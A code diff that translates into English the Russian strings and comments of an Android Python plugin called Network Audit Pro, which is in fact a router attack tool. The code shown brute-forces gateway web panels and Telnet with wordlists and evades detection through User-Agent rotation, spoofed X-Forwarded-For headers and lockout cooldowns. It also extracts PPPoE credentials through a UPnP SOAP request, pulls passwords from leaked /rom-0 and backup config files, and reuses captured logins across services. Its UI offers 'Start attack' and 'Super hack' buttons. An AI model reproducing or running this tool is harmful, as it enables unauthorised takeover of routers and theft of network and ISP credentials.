-                self._log("Telnet {}: порт закрыт или фильтр".format(host), "SCAN")
+                self._log("Telnet {}: port closed or filtered".format(host), "SCAN")
                 return
-        self._log("Telnet: словарь отработал без успеха", "SCAN")
+        self._log("Telnet: wordlist finished without success", "SCAN")
 
     def _cross_apply_telnet_creds(self, user, passwd):
-        # креды Telnet часто совпадают с веб-админкой — одна проверка, не брутфорс
+        # Telnet creds often match the web admin — a single check, not brute force
         if self.running:
             return
         gen_snapshot = self._run_gen
@@ -1716,7 +1716,7 @@ class NetAuditPro(BasePlugin):
                 self.gateway, self.port, "GET", "/", None,
                 generate_basic_token(user, passwd), float(self.timeout_seconds), body
             ):
-                self._log("Креды Telnet подходят к веб-панели {}:{}!".format(self.gateway, self.port), "HIT")
+                self._log("Telnet credentials also work on the web panel {}:{}!".format(self.gateway, self.port), "HIT")
                 with self.stats_lock:
                     if not self.found_creds and self._run_gen == gen_snapshot:
                         self.found_creds = (user, passwd, "basic")
@@ -1725,7 +1725,7 @@ class NetAuditPro(BasePlugin):
             pass
 
     def probe_upnp_credentials(self, port=1900, timeout=1.5):
-        # WANPPPConnection.GetUserName/GetPassword через una-broadcast SOAP отдаёт PPPoE-учётку
+        # WANPPPConnection.GetUserName/GetPassword via una-broadcast SOAP yields the PPPoE account
         soap = (
             '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
             '<s:Body><u:GetPPPAuthenticationCredentials '
@@ -1763,9 +1763,9 @@ class NetAuditPro(BasePlugin):
         return got
 
     def _probe_leaked_configs(self):
-        # пробуем скачать конфиг и вытащить пароли из дампа
+        # try downloading the config and pulling passwords from the dump
         if self.running:
-            self._log("Проверка конфигов пропущена: подбор занял сеть", "SCAN")
+            self._log("Config checks skipped: brute force occupies the network", "SCAN")
             return
         for route in ("/rom-0", "/backup_settings_2.xml"):
             if self.stop_flag:
@@ -1788,11 +1788,11 @@ class NetAuditPro(BasePlugin):
                     leaked = [(user_v, pass_v)]
             if leaked:
                 for lv_u, lv_p in leaked[:3]:
-                    self._log("Утёкшие данные из {}: логин '{}' пароль '{}'".format(route, lv_u, lv_p), "VULN")
+                    self._log("Leaked data from {}: login '{}' password '{}'".format(route, lv_u, lv_p), "VULN")
                     if not self.found_creds:
-                        self.vulns_found.append("Учётка из {}: {} / {}".format(route, lv_u, lv_p))
+                        self.vulns_found.append("Account from {}: {} / {}".format(route, lv_u, lv_p))
 
-    # ------------------- Пробы уязвимостей -------------------
+    # ------------------- Vulnerability probes -------------------
 
     def simple_probe(self, path):
         status_code, _, _, body, _ = self.http_request(
@@ -1801,9 +1801,9 @@ class NetAuditPro(BasePlugin):
         return status_code, body
 
     def probe_vulnerabilities(self):
-        # защита от параллельного запуска: две пробы стирают list друг друга
+        # guard against parallel runs: two probes would erase each other's list
         if getattr(self, "_probing", False):
-            self._log("Проба уязвимостей уже идёт — подождите её окончания", "INFO")
+            self._log("A vulnerability probe is already running — wait for it to finish", "INFO")
             return
         self._probing = True
         try:
@@ -1818,7 +1818,7 @@ class NetAuditPro(BasePlugin):
             status_code, body = self.simple_probe(route)
             if status_code in (200, 206) and body and len(body.strip()) > 30:
                 self.vulns_found.append("{} — {}".format(route, description))
-                self._log("Открыт без логина: {}".format(route), "VULN")
+                self._log("Open without login: {}".format(route), "VULN")
 
         soap_body = (
             '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
@@ -1838,8 +1838,8 @@ class NetAuditPro(BasePlugin):
             udp_sock.sendto(upnp_packet.encode("utf-8"), (self.gateway, 1900))
             data, _ = udp_sock.recvfrom(4096)
             if data:
-                self.vulns_found.append("UPnP (порт 1900) отвечает любому запросу — наружу торчит WAN-статус")
-                self._log("UPnP отвечает без ограничений", "VULN")
+                self.vulns_found.append("UPnP (port 1900) answers any request — WAN status is exposed")
+                self._log("UPnP responds without restrictions", "VULN")
         except Exception:
             pass
         finally:
@@ -1852,8 +1852,8 @@ class NetAuditPro(BasePlugin):
             telnet_sock.close()
             if banner:
                 decoded = banner.decode("latin-1", errors="replace").strip().replace("\n", " ").replace("\r", "")
-                self.vulns_found.append("Telnet (порт 23) открыт, баннер: '{}' — тот же словарь может подойти".format(decoded[:60]))
-                self._log("Telnet открыт с баннером: {}".format(decoded[:60]), "VULN")
+                self.vulns_found.append("Telnet (port 23) is open, banner: '{}' — the same wordlist may work".format(decoded[:60]))
+                self._log("Telnet open with banner: {}".format(decoded[:60]), "VULN")
         except Exception:
             pass
         finally:
@@ -1863,20 +1863,20 @@ class NetAuditPro(BasePlugin):
         upnp_creds = self.probe_upnp_credentials()
         if upnp_creds:
             for lu, lp in upnp_creds:
-                self._log("UPnP раскрыл PPPoE-учётку: '{}' / '{}'".format(lu, lp), "VULN")
-                self.vulns_found.append("PPPoE-учётка через UPnP: {} / {}".format(lu, lp))
+                self._log("UPnP exposed a PPPoE account: '{}' / '{}'".format(lu, lp), "VULN")
+                self.vulns_found.append("PPPoE account via UPnP: {} / {}".format(lu, lp))
 
         self._probe_telnet()
         self._probe_leaked_configs()
 
         if not self.vulns_found:
-            self._log("Известных открытых точек не найдено (фильтр MAC или пропатченная прошивка)", "INFO")
+            self._log("No known open endpoints found (MAC filter or patched firmware)", "INFO")
         self.refresh()
 
-    # ------------------- Таймер UI -------------------
+    # ------------------- UI timer -------------------
 
     def _finalize_run_summary(self, outcome):
-        # одна сводка на прогон: скорость, длительность, попытки
+        # one summary per run: speed, duration, attempts
         if getattr(self, "last_run_summary", None) is not None:
             return
         elapsed = time.time() - getattr(self, "_brute_started_ts", 0.0)
@@ -1917,23 +1917,23 @@ class NetAuditPro(BasePlugin):
             return
         if self.found_creds:
             self.running = False
-            self.status_line = "Готово! Доступ получен, смотрите плашку выше."
+            self.status_line = "Done! Access gained, see the panel above."
             self._finalize_run_summary("success")
         elif not self.stop_flag or self.tried_count >= self.expected_total:
             self.running = False
-            self.status_line = "Список исчерпан — пароль не найден. Запустите «Только уязвимости»."
-            self._log("Перебор завершён: словарь исчерпан без успеха", "WARN")
+            self.status_line = "List exhausted — password not found. Run \"Vulnerabilities only\"."
+            self._log("Brute force finished: wordlist exhausted without success", "WARN")
             self._finalize_run_summary("exhausted")
         self.refresh()
 
-    # ------------------- Запуск / остановка -------------------
+    # ------------------- Start / stop -------------------
 
     def _run_recon(self):
         status_code, location, _, body, full_text = self.http_request(
             self.gateway, self.port, "GET", "/", None, None, float(self.timeout_seconds), evade=False
         )
-        # классика nginx-роутеров: HTTP-порт отдаёт только 302 на https://host/.
-        # Один раз переезжаем на 443 и пересобираем разведку по TLS
+        # classic nginx routers: the HTTP port serves only a 302 to https://host/.
+        # once we move to 443 and redo recon over TLS
         if status_code in (301, 302) and str(location or "").lower().startswith("https://") and self.port != 443:
             loc_host = ""
             try:
@@ -1943,13 +1943,13 @@ class NetAuditPro(BasePlugin):
             if loc_host in ("", self.gateway):
                 self.port = 443
                 self.set_setting("port", 443)
-                self._log("Панель отвечает только по HTTPS (302 на https://{}). Переключился на 443 (TLS).".format(loc_host or self.gateway), "SCAN")
+                self._log("The panel answers only over HTTPS (302 to https://{}). Switched to 443 (TLS).".format(loc_host or self.gateway), "SCAN")
                 self.refresh()
                 return self._run_recon()
         if status_code <= 0:
             return False
-        # LuCI отдаёт посадочную с <meta http-equiv=refresh url=cgi-bin/luci/>:
-        # один переход по внутреннему target — там уже панель/логин
+        # LuCI serves a landing page with <meta http-equiv=refresh url=cgi-bin/luci/>:
+        # one hop to the internal target — the panel/login is already there
         meta_m = None
         try:
             meta_m = re.search(
@@ -1966,7 +1966,7 @@ class NetAuditPro(BasePlugin):
                     _s2, _l2, _ck2, _b2, full_text = self.http_request(
                         self.gateway, self.port, "GET", target, None, None, float(self.timeout_seconds), evade=False
                     )
-                    self._log("Мета-редирект посадочной: панель, вероятно, на {}".format(target), "SCAN")
+                    self._log("Meta redirect on the landing page: the panel is probably at {}".format(target), "SCAN")
                 except Exception:
                     pass
         self.panel_title = self.parse_title(full_text)
@@ -1977,7 +1977,7 @@ class NetAuditPro(BasePlugin):
         )
         realm_raw = self.extract_realm(full_text)
         www_header = self.extract_www_authenticate(full_text)
-        # сбрасываем прошлое состояние: без свежего 401 схема остаётся Basic
+        # reset the previous state: without a fresh 401 the scheme stays Basic
         self.auth_scheme = "basic"
         self.digest_params = None
         self.auth_realm = ""
@@ -1985,18 +1985,18 @@ class NetAuditPro(BasePlugin):
             self.auth_scheme = "digest"
             self.digest_params = parse_digest_challenge(www_header)
             self.auth_realm = self.digest_params.get("realm", "")
-            self._log("Защита Digest Auth (MD5), Realm: {}".format(self.auth_realm), "SCAN")
+            self._log("Digest Auth protection (MD5), Realm: {}".format(self.auth_realm), "SCAN")
         elif realm_raw:
             self.auth_scheme = "basic"
             self.digest_params = None
             self.auth_realm = realm_raw
-            self._log("Защита Basic Auth, Realm: {}".format(realm_raw), "SCAN")
+            self._log("Basic Auth protection, Realm: {}".format(realm_raw), "SCAN")
         action = self.find_form_action(full_text)
         if action:
-            self._log("Найдена HTML-форма входа: POST {}".format(action), "SCAN")
-        self._log("Панель определена как {}. Title: {}".format(self.brand_hint, (self.panel_title or "-")[:60]), "SCAN")
+            self._log("Found an HTML login form: POST {}".format(action), "SCAN")
+        self._log("Panel identified as {}. Title: {}".format(self.brand_hint, (self.panel_title or "-")[:60]), "SCAN")
         self._detected_form_action = action
-        # динамические имена полей конкретно этого роутера
+        # dynamic field names of this specific router
         fields = extract_form_fields(full_text)
         self._form_fields = fields if fields[1] else None
         return True
@@ -2009,13 +2009,13 @@ class NetAuditPro(BasePlugin):
     def _auto_detect_gateway_now(self):
         ip = self._detect_local_ip_cached()
         if not ip or ip.count(".") != 3:
-            self.toast("❌ Не удалось определить ваш IP")
+            self.toast("❌ Failed to determine your IP")
             return
         guessed = ".".join(ip.split(".")[:-1]) + ".1"
         self.gateway = guessed
         self.set_setting("gateway", self.gateway)
-        self._log("Шлюз автоопределён: {}".format(guessed), "OK")
-        self.toast("🎯 Шлюз: {}".format(guessed))
+        self._log("Gateway auto-detected: {}".format(guessed), "OK")
+        self.toast("🎯 Gateway: {}".format(guessed))
         self.refresh()
 
     def _run_passhunt(self):
@@ -2023,18 +2023,18 @@ class NetAuditPro(BasePlugin):
             self._stop_passhunt()
             return
 
-        # новый прогон: старые воркеры (могут висеть в socket-таймауте до ~2*timeout)
-        # увидят смену поколения и выйдут, не трогая общий курсор нового запуска
+        # new run: old workers (may hang in a socket timeout for up to ~2*timeout)
+        # will see the generation change and exit without touching the new run's shared cursor
         self._run_gen = getattr(self, "_run_gen", 0) + 1
 
         gateway_clean = str(self.gateway or "").strip()
         if not gateway_clean or "." not in gateway_clean or gateway_clean.startswith("198.18."):
-            self.toast("❌ Укажите корректный IP шлюза (без VPN Fake-IP)")
+            self.toast("❌ Specify a correct gateway IP (no VPN Fake-IP)")
             return
 
         if self._detect_vpn():
-            self._log("⚠️ Обнаружен VPN: шлюз может быть неверным и атаки могут идти мимо роутера", "WARN")
-            self.toast("🛡 Внимание: активен VPN!")
+            self._log("⚠️ VPN detected: the gateway may be wrong and attacks may miss the router", "WARN")
+            self.toast("🛡 Warning: VPN is active!")
 
         self.running = True
         self.stop_flag = False
@@ -2054,16 +2054,16 @@ class NetAuditPro(BasePlugin):
         self.pps = 0
         self._consec_lockouts = 0
         self._cooldown_until = 0.0
-        self.status_line = "Разведка панели..."
+        self.status_line = "Panel recon..."
         self.refresh()
 
         probe_ok = self._run_recon()
         if not probe_ok:
-            self._log("Нет связи с {}:{}.".format(self.gateway, self.port), "ERR")
-            self.status_line = "Нет связи с целью."
+            self._log("No connection to {}:{}.".format(self.gateway, self.port), "ERR")
+            self.status_line = "No connection to the target."
             self.running = False
             self.refresh()
-            self.toast("❌ Роутер не отвечает на {}:{}".format(self.gateway, self.port))
+            self.toast("❌ The router does not answer on {}:{}".format(self.gateway, self.port))
             return
 
         candidates = self._build_candidates()
@@ -2090,16 +2090,16 @@ class NetAuditPro(BasePlugin):
         self.last_run_summary = None
         imported_count = self._imported_pairs_count
         default_count = len(default_dict_pairs())
-        evade_info = "UA-ротация: {}, задержка {} мс, кулдаун {} с".format(
-            "вкл" if self.evasion_ua else "выкл",
+        evade_info = "UA rotation: {}, delay {} ms, cooldown {} s".format(
+            "on" if self.evasion_ua else "off",
             self.attempt_delay_ms,
             self.lockout_pause_s,
         )
-        self._log("Атака {}:{} · режим {} · потоки {} · {} комбинаций (встроенный словарь: {}, свой: {}) · {}".format(
+        self._log("Attack {}:{} · mode {} · threads {} · {} combinations (built-in wordlist: {}, custom: {}) · {}".format(
             self.gateway, self.port, self.mode, self.num_threads,
             len(candidates), default_count, imported_count, evade_info
         ), "BRUTE")
-        self.status_line = "Перебор идёт..."
+        self.status_line = "Brute force running..."
 
         self.threads = []
         threading.Thread(target=self._ui_progress_timer, daemon=True).start()
@@ -2115,7 +2115,7 @@ class NetAuditPro(BasePlugin):
                 t.start()
                 self.threads.append(t)
             except Exception as err:
-                self._log("Ошибка создания потока: {}".format(err), "ERR")
+                self._log("Thread creation error: {}".format(err), "ERR")
                 break
 
         self.refresh()
@@ -2125,56 +2125,56 @@ class NetAuditPro(BasePlugin):
             return
         self.stop_flag = True
         self.running = False
-        self.status_line = "Остановлено пользователем."
+        self.status_line = "Stopped by the user."
         self._finalize_run_summary("stopped")
-        self._log("⏹ Стоп. Попыток сделано: {}".format(self.tried_count), "INFO")
-        self.toast("Останавливаю перебор и ищу уязвимости...")
+        self._log("⏹ Stop. Attempts made: {}".format(self.tried_count), "INFO")
+        self.toast("Stopping brute force and looking for vulnerabilities...")
         threading.Thread(target=self.probe_vulnerabilities, daemon=True).start()
         self.refresh()
 
-    # ------------------- Отчёт -------------------
+    # ------------------- Report -------------------
 
     def _export_report(self):
         lines = [
-            "📋 === ОТЧЁТ Network Audit Pro v{} ===".format(__version__),
-            "Автор: {}".format(__author__),
-            "Цель: {}:{} · режим {} · потоки {} · таймаут {}с".format(
+            "📋 === REPORT Network Audit Pro v{} ===".format(__version__),
+            "Author: {}".format(__author__),
+            "Target: {}:{} · mode {} · threads {} · timeout {}s".format(
                 self.gateway, self.port, self.mode, self.num_threads, self.timeout_seconds
             ),
-            "Обход детекта: UA-ротация {}, XFF {}, базовая задержка {} мс, кулдаун {} с (пауз за прогон: {})".format(
-                "вкл" if self.evasion_ua else "выкл",
-                "вкл" if self.evasion_xff else "выкл",
+            "Detection evasion: UA rotation {}, XFF {}, base delay {} ms, cooldown {} s (pauses per run: {})".format(
+                "on" if self.evasion_ua else "off",
+                "on" if self.evasion_xff else "off",
                 self.attempt_delay_ms,
                 self.lockout_pause_s,
                 self.evade_pauses,
             ),
-            "--- Панель ---",
-            "Определённый бренд: {}".format(self.brand_hint or "-"),
-            "Title страницы: {}".format(self.panel_title or "-"),
+            "--- Panel ---",
+            "Detected brand: {}".format(self.brand_hint or "-"),
+            "Page title: {}".format(self.panel_title or "-"),
             "Basic realm: {}".format(self.auth_realm or "-"),
-            "--- Итог проверки доступа ---"
+            "--- Access check result ---"
         ]
         if self.found_creds:
             u, p, m = self.found_creds
-            lines.append("✅ ДОСТУП ПОЛУЧЕН")
-            lines.append("Логин:  {}".format(u if u else "(пусто)"))
-            lines.append("Пароль: {}".format(p if p else "(пусто)"))
-            lines.append("Способ: {}".format(AUTH_MODE_LABELS.get(m, "HTML-форма POST")))
+            lines.append("✅ ACCESS GAINED")
+            lines.append("Login:  {}".format(u if u else "(empty)"))
+            lines.append("Password: {}".format(p if p else "(empty)"))
+            lines.append("Method: {}".format(AUTH_MODE_LABELS.get(m, "HTML form POST")))
         elif self.tried_count > 0:
-            lines.append("❌ Пароль не подобран за {} попыток".format(self.tried_count))
+            lines.append("❌ No password found in {} attempts".format(self.tried_count))
         else:
-            lines.append("ℹ️ Перебор ещё не выполнялся")
-        lines.append("Статистика: попыток {} · неудач {} · блокировок {}".format(
+            lines.append("ℹ️ Brute force has not run yet")
+        lines.append("Stats: attempts {} · failures {} · lockouts {}".format(
             self.tried_count, self.fail_count, self.lockout_count
         ))
         imported_pairs_count = self._imported_pairs_count
-        lines.append("Свой словарь: {} пар".format(imported_pairs_count))
-        lines.append("--- Уязвимости без пароля ---")
+        lines.append("Custom dictionary: {} pairs".format(imported_pairs_count))
+        lines.append("--- Passwordless vulnerabilities ---")
         if self.vulns_found:
             for item in self.vulns_found:
                 lines.append("• {}".format(item))
         else:
-            lines.append("• Не обнаружены или цель закрыта фильтром")
+            lines.append("• None found or the target is closed by a filter")
         lines.append("=" * 48)
         self.generated_report_text = "\n".join(lines)
 
@@ -2184,15 +2184,15 @@ class NetAuditPro(BasePlugin):
             saved_path = "/sdcard/Download/net_audit_report_{}.txt".format(stamp)
             with open(saved_path, "w", encoding="utf-8") as f:
                 f.write(self.generated_report_text)
-            self._log("Отчёт сохранён в Download", "OK")
+            self._log("Report saved to Download", "OK")
         except Exception as exc:
-            self._log("Не удалось сохранить файл: {}".format(exc), "ERR")
+            self._log("Failed to save the file: {}".format(exc), "ERR")
 
         copied = self._copy_text_to_clipboard(self.generated_report_text)
         if copied:
-            self._log("Отчёт скопирован в буфер обмена", "OK")
+            self._log("Report copied to the clipboard", "OK")
 
-        self.toast("📤 Отчёт готов{}".format("" if copied else " (буфер недоступен)"))
+        self.toast("📤 Report ready{}".format("" if copied else " (clipboard unavailable)"))
         self.navigate("report")
         self.refresh()
 
@@ -2210,20 +2210,20 @@ class NetAuditPro(BasePlugin):
 
     def _copy_credentials(self):
         if not self.found_creds:
-            self.toast("Нет найденного доступа")
+            self.toast("No found access")
             return
         u, p, _m = self.found_creds
         ok = self._copy_text_to_clipboard("{}:{}".format(u, p))
-        self.toast("🔑 Логин:пароль в буфере" if ok else "Буфер недоступен")
+        self.toast("🔑 Login:password copied" if ok else "Clipboard unavailable")
 
-    # ------------------- Диагностика сети -------------------
+    # ------------------- Network diagnostics -------------------
 
     def _test_ping(self):
         gateway_clean = str(self.gateway or "").strip()
         if not gateway_clean or "." not in gateway_clean:
-            self.toast("❌ Задайте корректный IP")
+            self.toast("❌ Set a correct IP")
             return
-        self.status_line = "Проверяю связь..."
+        self.status_line = "Checking connectivity..."
         self.refresh()
 
         def ping_worker():
@@ -2231,28 +2231,28 @@ class NetAuditPro(BasePlugin):
                 started = time.time()
                 s = socket.create_connection((gateway_clean, self.port), timeout=float(min(self.timeout_seconds, 5)))
                 if self.port in (23, 21, 22, 443):
-                    # для Telnet/FTP/SSH/443 bare TCP-connect — HTTP GET им не по адресу
+                    # for Telnet/FTP/SSH/443 a bare TCP-connect — an HTTP GET is not for them
                     elapsed = round((time.time() - started) * 1000, 1)
                     self._safe_close_socket(s)
-                    self.ping_status_text = "✅ Отвечает за {} ms (TCP)".format(elapsed)
-                    self._log("Шлюз {}:{} доступен ({} ms, TCP без запроса)".format(gateway_clean, self.port, elapsed), "OK")
+                    self.ping_status_text = "✅ Responds in {} ms (TCP)".format(elapsed)
+                    self._log("Gateway {}:{} reachable ({} ms, TCP without a request)".format(gateway_clean, self.port, elapsed), "OK")
                     self.refresh()
                     return
                 s.sendall(b"GET / HTTP/1.1\r\nHost: probe\r\nConnection: close\r\n\r\n")
                 s.recv(256)
                 elapsed = round((time.time() - started) * 1000, 1)
                 self._safe_close_socket(s)
-                self.ping_status_text = "✅ Отвечает за {} ms".format(elapsed)
-                self._log("Шлюз {}:{} доступен ({} ms)".format(gateway_clean, self.port, elapsed), "OK")
+                self.ping_status_text = "✅ Responds in {} ms".format(elapsed)
+                self._log("Gateway {}:{} reachable ({} ms)".format(gateway_clean, self.port, elapsed), "OK")
             except Exception as exc:
-                self.ping_status_text = "❌ Нет ответа: {}".format(exc)
-                self._log("Цель {}:{} недоступна: {}".format(gateway_clean, self.port, exc), "ERR")
+                self.ping_status_text = "❌ No reply: {}".format(exc)
+                self._log("Target {}:{} unreachable: {}".format(gateway_clean, self.port, exc), "ERR")
             self.refresh()
 
         threading.Thread(target=ping_worker, daemon=True).start()
 
     def _run_port_scan(self):
-        self.scan_results_txt = "Сканирую порты..."
+        self.scan_results_txt = "Scanning ports..."
         self.refresh()
 
         def scan_worker():
@@ -2271,18 +2271,18 @@ class NetAuditPro(BasePlugin):
                     pass
             if opened:
                 shown = ", ".join(["{} ({})".format(port_num, service_name) for port_num, service_name in opened])
-                self.scan_results_txt = "Открытые порты: " + shown + (" (443: TLS не проверяется)" if 443 in opened else "")
-                self._log("Открытые порты шлюза: {}".format(shown), "OK")
+                self.scan_results_txt = "Open ports: " + shown + (" (443: TLS not checked)" if 443 in opened else "")
+                self._log("Gateway open ports: {}".format(shown), "OK")
                 if self.port not in [p for p, _ in opened]:
-                    # автопереключение только на HTTP-семейство; Telnet/FTP/443(TLS) не годятся
+                    # auto-switch only within the HTTP family; Telnet/FTP/443(TLS) do not qualify
                     http_ports = [p for p, name in opened if name in ("HTTP", "Web-Alt")]
                     if http_ports:
                         self.port = http_ports[0]
                         self.set_setting("port", self.port)
-                        self._log("Основной порт переключён на {}".format(self.port), "OK")
+                        self._log("Main port switched to {}".format(self.port), "OK")
             else:
-                self.scan_results_txt = "Открытых TCP-портов не найдено"
-                self._log("Сканер портов: ничего открыто", "WARN")
+                self.scan_results_txt = "No open TCP ports found"
+                self._log("Port scanner: nothing open", "WARN")
             self.refresh()
 
         threading.Thread(target=scan_worker, daemon=True).start()
@@ -2322,7 +2322,7 @@ class NetAuditPro(BasePlugin):
             if not self.gateway:
                 self.gateway = guessed
                 self.set_setting("gateway", self.gateway)
-                self._log("Шлюз автоопределён по вашему IP: {}".format(guessed), "OK")
+                self._log("Gateway auto-detected from your IP: {}".format(guessed), "OK")
 
     def _detect_wifi_connected(self):
         ip = self._detect_local_ip_cached()
@@ -2345,15 +2345,15 @@ class NetAuditPro(BasePlugin):
             try:
                 ok = self._run_recon()
                 if not ok:
-                    self._log("Разведка не удалась: цель не отвечает", "ERR")
+                    self._log("Recon failed: the target does not answer", "ERR")
             except Exception as err:
-                self._log("Ошибка разведки: {}".format(err), "ERR")
+                self._log("Recon error: {}".format(err), "ERR")
             self.refresh()
 
         threading.Thread(target=recon_worker, daemon=True).start()
-        self.toast("🧠 Заново определяю панель...")
+        self.toast("🧠 Re-detecting the panel...")
 
-    # ------------------- Сеттеры UI -------------------
+    # ------------------- UI setters -------------------
 
     def _set_gateway(self, value):
         val = str(value or "").strip()
@@ -2422,7 +2422,7 @@ class NetAuditPro(BasePlugin):
         self.set_setting("custom_passes", self.custom_passes_text)
 
     def _dict_preview_pairs(self, text):
-        # парсим только при смене текста, не на каждом рендере экрана
+        # parse only when the text changes, not on every screen render
         text_key = str(text or "")
         cache = getattr(self, "_preview_cache", None)
         if cache is not None and (cache[0] is text_key or cache[0] == text_key):
@@ -2432,7 +2432,7 @@ class NetAuditPro(BasePlugin):
         return pairs
 
     def _recount_dict_pairs(self):
-        # финальный подсчёт после паузы в наборе текста (дебаунс)
+        # final count after a typing pause (debounce)
         try:
             self._imported_pairs_count = len(self._parse_dict_pairs(self.custom_dict_text))
             self._preview_cache = None
@@ -2454,7 +2454,7 @@ class NetAuditPro(BasePlugin):
         self._preview_cache = None
         self.set_setting("custom_dict_text", self.custom_dict_text)
         self._cancel_dict_parse_timer()
-        # не парсим 1 МБ на каждую нажатую клавишу — пересчитаем после паузы
+        # do not parse 1 MB on every keystroke — recount after a pause
         self._dict_parse_timer = threading.Timer(0.8, self._recount_dict_pairs)
         self._dict_parse_timer.daemon = True
         self._dict_parse_timer.start()
@@ -2465,17 +2465,17 @@ class NetAuditPro(BasePlugin):
 
     def _refresh_file_list(self):
         self._dict_scan_cache = ()
-        self.toast("🔄 Пересканирую память...")
+        self.toast("🔄 Rescanning storage...")
         self.refresh()
 
     def on_plugin_unload(self):
-        # смена поколения будит воркеров, зависших в socket-чтении
+        # a generation change wakes workers stuck in socket reads
         self._run_gen = getattr(self, "_run_gen", 0) + 1
         self.stop_flag = True
         self.running = False
         self._cancel_dict_parse_timer()
 
-    # ------------------- Экраны UI -------------------
+    # ------------------- UI screens -------------------
 
     def screen_main(self, ui, api, state):
         wifi_ok = self._detect_wifi_connected()
@@ -2489,16 +2489,16 @@ class NetAuditPro(BasePlugin):
             ui.row([
                 ui.icon("wifi", 34, tint="success" if wifi_ok else "warning"),
                 ui.column([
-                    ui.text("Wi-Fi подключён" if wifi_ok else "Проверьте Wi-Fi/LAN", "titleLarge"),
-                    ui.text("Ваш IP: {} · Шлюз: {} · Порт: {}".format(
+                    ui.text("Wi-Fi connected" if wifi_ok else "Check Wi-Fi/LAN", "titleLarge"),
+                    ui.text("Your IP: {} · Gateway: {} · Port: {}".format(
                         my_ip, self.gateway or "-", self.port
                     ), "bodyMedium"),
                 ], spacing=2),
             ], spacing=12),
             ui.row(
-                ([ui.chip("🛡 VPN активен", True)] if vpn_ok else []) + [
-                    ui.chip("Встроенный: {} пар".format(len(default_dict_pairs())), False),
-                    ui.chip("Свой: {} пар".format(imported_count), False),
+                ([ui.chip("🛡 VPN active", True)] if vpn_ok else []) + [
+                    ui.chip("Built-in: {} pairs".format(len(default_dict_pairs())), False),
+                    ui.chip("Custom: {} pairs".format(imported_count), False),
                     ui.chip("v{}".format(__version__), False),
                 ],
                 spacing=6,
@@ -2507,72 +2507,72 @@ class NetAuditPro(BasePlugin):
 
         children.append(ui.card(ui.column([
             ui.row([
-                ui.text("🎯 Цель атаки", "titleSmall"),
-                ui.button("Настройки", on_click=lambda: self.navigate("attack_settings"), style="text")
+                ui.text("🎯 Attack target", "titleSmall"),
+                ui.button("Settings", on_click=lambda: self.navigate("attack_settings"), style="text")
             ], fill_max_width=True),
             ui.row([
                 ui.text_field(
                     value=str(self.gateway),
                     on_change=lambda v: self._set_gateway(v),
-                    label="IP шлюза (роутера)",
+                    label="Gateway (router) IP",
                     single_line=True,
                     fill_max_width=True
                 ),
-                ui.button("🎯 Авто-IP", on_click=self._auto_detect_gateway_now, style="outlined")
+                ui.button("🎯 Auto-IP", on_click=self._auto_detect_gateway_now, style="outlined")
             ], fill_max_width=True),
             ui.row([
-                ui.button("⚡ Пинг", on_click=self._test_ping, style="outlined"),
-                ui.button("🔍 Порты", on_click=self._run_port_scan, style="outlined"),
-                ui.button("♻️ Разведка", on_click=self._recheck_panel, style="outlined")
+                ui.button("⚡ Ping", on_click=self._test_ping, style="outlined"),
+                ui.button("🔍 Ports", on_click=self._run_port_scan, style="outlined"),
+                ui.button("♻️ Recon", on_click=self._recheck_panel, style="outlined")
             ], spacing=8, fill_max_width=True),
             ui.text(self.ping_status_text, "bodySmall"),
             ui.text(self.scan_results_txt, "bodySmall"),
-            ui.text("Бренд: {} · Realm: {} · Защита: {}".format(
-                self.brand_hint or "не определён",
+            ui.text("Brand: {} · Realm: {} · Auth: {}".format(
+                self.brand_hint or "unknown",
                 self.auth_realm or "-",
-                "Digest" if self.auth_scheme == "digest" else "Basic/форма"
+                "Digest" if self.auth_scheme == "digest" else "Basic/form"
             ), "bodySmall")
         ], spacing=6)))
 
         children.append(ui.card(ui.column([
             ui.row([
-                ui.text("🔤 Словари", "titleSmall"),
-                ui.button("Выбрать", on_click=self._open_dict_screen, style="text")
+                ui.text("🔤 Dictionaries", "titleSmall"),
+                ui.button("Select", on_click=self._open_dict_screen, style="text")
             ], fill_max_width=True),
-            ui.text("Встроенный словарь: {} пар · Свой словарь: {} пар".format(
+            ui.text("Built-in dictionary: {} pairs · Custom dictionary: {} pairs".format(
                 len(default_dict_pairs()), imported_count
             ), "bodyMedium")
         ], spacing=4)))
 
         children.append(ui.card(ui.row([
             ui.column([
-                ui.text("⚙️ Атака", "titleMedium"),
-                ui.text("{} · потоков {} · задержка {} мс · стоп-на-успех: {}".format(
-                    {"auto": "Auto", "basic": "Basic", "form": "Форма"}.get(self.mode, self.mode),
+                ui.text("⚙️ Attack", "titleMedium"),
+                ui.text("{} · threads {} · delay {} ms · stop-on-success: {}".format(
+                    {"auto": "Auto", "basic": "Basic", "form": "Form"}.get(self.mode, self.mode),
                     self.num_threads, self.attempt_delay_ms,
-                    "вкл" if self.stop_on_success else "выкл"
+                    "on" if self.stop_on_success else "off"
                 ), "bodyMedium"),
             ], spacing=2),
-            ui.button("Настроить", on_click=lambda: self.navigate("attack_settings"), style="tonal")
+            ui.button("Configure", on_click=lambda: self.navigate("attack_settings"), style="tonal")
         ], fill_max_width=True)))
 
         control_children = [
             ui.button(
-                "🚀 Запустить атаку" if not self.running else "⏹ Остановить",
+                "🚀 Start attack" if not self.running else "⏹ Stop",
                 on_click=self._run_passhunt,
                 style="filled" if not self.running else "error",
                 fill_max_width=True
             ),
-            ui.button("🔓 Только уязвимости", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
-            ui.button("💥 Супер взлом", on_click=self._super_hack_button, style="outlined", fill_max_width=True),
+            ui.button("🔓 Vulnerabilities only", on_click=self._probe_vulns_button, style="tonal", fill_max_width=True),
+            ui.button("💥 Super hack", on_click=self._super_hack_button, style="outlined", fill_max_width=True),
             ui.row([
-                ui.button("📤 Отчёт", on_click=self._export_report, style="text", fill_max_width=True),
-                ui.button("📝 Журнал", on_click=self._open_logs_screen, style="text", fill_max_width=True),
+                ui.button("📤 Report", on_click=self._export_report, style="text", fill_max_width=True),
+                ui.button("📝 Log", on_click=self._open_logs_screen, style="text", fill_max_width=True),
             ], spacing=8, fill_max_width=True)
         ]
         children.append(ui.card(ui.column(control_children, spacing=6)))
 
-        # Плашка результата / живая скорость
+        # Result card / live speed
         progress_card = []
         if self.running:
             percent_done = 0
@@ -2584,19 +2584,19 @@ class NetAuditPro(BasePlugin):
             if self.pps > 0 and remaining > 0:
                 eta_sec = int(remaining / self.pps)
                 if eta_sec >= 90:
